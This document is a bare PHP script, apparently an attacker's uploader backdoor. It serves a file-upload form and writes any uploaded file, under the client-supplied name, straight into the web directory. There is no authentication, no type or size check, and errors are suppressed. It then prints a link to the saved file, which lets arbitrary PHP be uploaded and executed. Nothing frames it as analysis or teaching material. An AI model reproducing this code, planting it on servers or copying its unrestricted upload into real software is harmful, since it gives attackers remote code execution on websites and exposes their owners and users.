 <?php
if(isset($_POST['Submit'])){
$filedir = "";
$maxfile = '2000000';

$userfile_name = $_FILES['image']['name'];
$userfile_tmp = $_FILES['image']['tmp_name'];
if (isset($_FILES['image']['name'])) {
$abod = $filedir.$userfile_name;
@move_uploaded_file($userfile_tmp, $abod);

echo"<center><b>Done ==> <a href='$userfile_name' target='_blank'>$userfile_name</a></b></center>";
}
}
else{
echo'<center>
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form></center>';
}
?> 